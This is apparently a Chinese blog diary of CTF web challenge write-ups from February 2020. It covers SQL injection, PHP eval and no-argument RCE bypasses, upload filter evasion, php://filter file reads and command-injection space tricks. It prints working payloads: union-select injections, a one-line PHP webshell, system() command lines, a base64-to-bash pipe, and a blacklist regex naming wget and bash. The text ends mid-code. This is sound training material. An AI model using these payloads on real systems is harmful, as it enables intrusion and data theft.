<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[<span class="string">'query'</span>] || flag from flag</span><br></pre></td></tr></table></figure>
<p>解法一：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;set sql_mode=PIPES_AS_CONCAT;select <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p> 相当于select 1,flag from Flag </p>
<p>解法二：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
<p> 相当于select *,1||flag from Flag 取得全部数据</p>
<h2 id="2020-2-6"><a href="#2020-2-6" class="headerlink" title="2020/2/6"></a>2020/2/6</h2><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>右键源代码看到了有个calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>是对num参数进行过滤，然后执行</p>
<p>先过waf,再让php去解析</p>
<p>%20num  会绕过waf对num的检测  因为检测的名称不一样</p>
<p>php解析的时候又会去掉%20空格，解析num</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看目录payload:? num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看flagpayload:</span><br><span class="line">? num=<span class="number">1</span>;var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>上传新姿势</p>
<p>因为会判断上传的文件的类型</p>
<p>可以加上相应的头字绕过：</p>
<ul>
<li>JPG ：FF D8 FF E0 00 10 4A 46 49 46</li>
<li>GIF(相当于文本的GIF89a)：47 49 46 38 39 61</li>
<li>PNG： 89 50 4E 47</li>
</ul>
<p>考点 ：<strong>.user.ini</strong>[<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html]" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html]</a></p>
<p> <code>auto_prepend_file=ling.jpg</code> </p>
<p> 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： </p>
<p>过滤了&lt;?符号</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;phpinfo();@<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p> 那么当我们访问<strong>此目录</strong>下的任何一个文件时，都会去包含test.jpg </p>
<h1 id="2020-2-7"><a href="#2020-2-7" class="headerlink" title="2020/2/7"></a>2020/2/7</h1><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开页面,右键查看源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">      <span class="keyword">echo</span> $cat;</span><br><span class="line">      <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>传参:?cat=dog</p>
<p>出现flag</p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>全选页面,发现隐藏的超链接</p>
<p>点进去再点secret中间会有一个跳转</p>
<p>抓包可以知道是action.php的跳转</p>
<p>burp访问可以看到源码</p>
<!--
   secr3t.php        
-->
<p>访问secr3t.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>利用pjp伪协议读取flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<h1 id="2020-2-8"><a href="#2020-2-8" class="headerlink" title="2020/2/8"></a>2020/2/8</h1><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>无参数<strong>RCE</strong> 参考链接</p>
<p><code>https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</code></p>
<p>打开什么都没有,通过git泄露扫描工具得到index源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以传参,但是对输入进行了严格的过滤,如果通过检测,就可以被eval执行。</p>
<p>过滤了几个常见的伪协议,不能通过伪协议读取文件</p>
<p>preg_replace函数中的正则匹配是<strong>无参数函数的校验</strong></p>
<p> 其只允许执行如下格式函数 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()));</span><br><span class="line"></span><br><span class="line">a();</span><br></pre></td></tr></table></figure>
<p>current() 返回数组中的当前单元, 默认取第一个值。 </p>
<p> localeconv() 函数返回一包含本地数字及货币格式信息的数组 </p>
<p> pos() current() 的别名 </p>
<p>这里还有一个知识点：</p>
<p><strong>current(localeconv())永远都是个点</strong></p>
<p>?exp=print_r(localeconv());</p>
<p><img src="https://i.loli.net/2020/02/22/nJm7rk5ZNIy9TSa.png" alt="image-20200208125942784.png"></p>
<p>?exp=print_r(current(localeconv()));</p>
<p>这样会返回一个 <strong>.</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));=========print_r(scandir(pos(localeconv())));======================print_r(scandir(&apos;.&apos;));</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/22/TlbxHkRN6IJn8LU.png" alt="image-20200208130519921.png"></p>
<p>我们现在需要读出数组中倒数第二个内容 即flag.php</p>
<p>首先想到的是通过随机函数来读 array_rand()</p>
<p><strong>从数组中取出一个或多个随机的单元，并返回随机条目的一个或多个键。     它使用了伪随机数产生算法，所以不适合密码学场景， </strong></p>
<p>但是array_rand只能读出键</p>
<p>所以想办法把键值对互换</p>
<p><strong>array_flip()交换数组的键和值</strong></p>
<p>?exp=print_r(array_flip(scandir(current(localeconv()))));</p>
<p><img src="https://i.loli.net/2020/02/22/UfJmsXB3cphDtn5.png" alt="image-20200208132042379.png"></p>
<p>键值对交换完毕再用array_rand()随机读取</p>
<p>?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</p>
<p><img src="https://i.loli.net/2020/02/22/UqAGhX9SOWLNHxb.png" alt="image-20200208132134616.png"></p>
<p>刷新几次就能读出名字</p>
<p>配合readfile等函数读出flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>百分百读出flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/22/Ctj1wHTkebm4siO.png" alt="image-20200208132850316.png"></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入密码错误，查看源代码发现一串密文</p>
<p>base32解密然后base64解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &apos;$name&apos;</span><br></pre></td></tr></table></figure>
<p>发现有三个字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; union select &apos;1&apos;,&apos;2&apos;,&apos;3&apos;;#</span><br></pre></td></tr></table></figure>
<p>猜测是 id username password </p>
<p>这里考察的是对md5检验的绕过</p>
<p>由于只检验了md5(password),那么我们利用union select构造返回任意值</p>
<p>密码是1 password字段是1的md5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号：-1&apos; union select &apos;1&apos;,&apos;admin&apos; ,&apos;c4ca4238a0b923820dcc509a6f75849b&apos;;#</span><br><span class="line"></span><br><span class="line">密码：1</span><br></pre></td></tr></table></figure>
<p>这样就能通过检测</p>
<h1 id="2020-2-9"><a href="#2020-2-9" class="headerlink" title="2020/2/9"></a>2020/2/9</h1><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>绕过空格的方法大概有以下几种：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09 </span><br><span class="line">%0a</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`  #将反引号内命令的输出作为输入执行</span><br></pre></td></tr></table></figure>
<p><strong>命令执行变量拼接</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;a=g;tac$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
<p>参考链接：<a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12246386.html</a></p>
<p>此题不行的做法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.cat fl* 利用*匹配任意 不行</span><br><span class="line">2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash 也不行</span><br><span class="line">3.ca\t fl\ag.php 不行</span><br><span class="line">4.cat fl&apos;&apos;ag.php 不行</span><br></pre></td></tr></table></figure>
<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>今天打完awd,健完身实在累的不行了,但是必须每天刷两道,只能先刷个比较水的了</p>
<p>查源代码发现有个Secret.php,访问提示你不是来自这个网站</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It doesn<span class="string">'t come from '</span>https:<span class="comment">//www.Sycsecret.com'</span></span><br></pre></td></tr></table></figure>
<p>构造</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">referer:https://www.Sycsecret.com</span><br><span class="line"></span><br><span class="line">User-Agent:Syclover</span><br><span class="line"></span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="2020-2-10"><a href="#2020-2-10" class="headerlink" title="2020/2/10"></a>2020/2/10</h1><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>直接万能密码登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username： admin&apos; or 1=1#</span><br><span class="line">password:  x</span><br></pre></td></tr></table></figure>
<p>进去之后可以用username进行字符型的注入</p>
<p>password随便填</p>
<p>通过order by查询发现有三个字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos; order by 3--+%23&amp;password=1</span><br></pre></td></tr></table></figure>
<p>发现第二位上是username 第三位上是password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos; union select  1,2,3 --+%23&amp;password=1</span><br></pre></td></tr></table></figure>
<p>查询数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos; union select  1,2,group_concat(schema_name) from information_schema.schemata--+%23&amp;password=1</span><br></pre></td></tr></table></figure>
<p>查询当前数据库的表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos; union select  1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+%23&amp;password=1</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line"></span><br><span class="line">Your password is &apos;geekuser,l0ve1ysq1&apos;</span><br></pre></td></tr></table></figure>
<p>查询列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos; union select  1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;l0ve1ysq1&apos;--+%23&amp;password=1</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello 2！</span><br><span class="line"></span><br><span class="line">Your password is &apos;id,username,password&apos;</span><br></pre></td></tr></table></figure>
<p>查询内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1&apos; union select  1,2,group_concat(id,username,password) from l0ve1ysq1--+%23&amp;password=1</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>上传个常规的一句话木马提示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Not image!</span><br></pre></td></tr></table></figure>
<p>在文件头部加上GIF89a进行绕过还是不行</p>
<p>burpsuite启动</p>
<p>改了下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
<p>回显</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOT！php!</span><br></pre></td></tr></table></figure>
<p>换换后缀名试试</p>
<p>php php3 php4 php5 phtm phtml</p>
<p>一直试到phtml后缀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NO! HACKER! your file included <span class="string">'&amp;#x3C;&amp;#x3F;</span></span><br></pre></td></tr></table></figure>
<p>文件中包含这些字符还不行</p>
<p>html解码一下得知是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br></pre></td></tr></table></figure>
<p>使用js语言去解释php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[a]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>post传参</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=system(<span class="string">'cat /flag'</span>);</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="2020-2-11"><a href="#2020-2-11" class="headerlink" title="2020/2/11"></a>2020/2/11</h1><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>手动post不行,只能用蚁剑连接,在根目录找到flag</p>
<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>直接万能密码登录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username： admin&apos; or 1=1#</span><br><span class="line">password:  x</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="2020-2-12"><a href="#2020-2-12" class="headerlink" title="2020/2/12"></a>2020/2/12</h1><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>打开网页看到url中img是一段base64编码 base64解密两次后再hex解码是555.jpg</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0-&gt;MzUzNTM1MmU3MDZlNjc=-&gt;<span class="number">3535352e706</span>e67-&gt;<span class="number">555.</span>png</span><br></pre></td></tr></table></figure>
<p>把index.phphex加密后 base64在加密两次传上去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php-&gt;<span class="number">696e6465782</span>e706870-&gt;Njk2ZTY0NjU3ODJlNzA2ODcw-&gt;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure>
<p>在源代码里返回了index.php的base64编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) 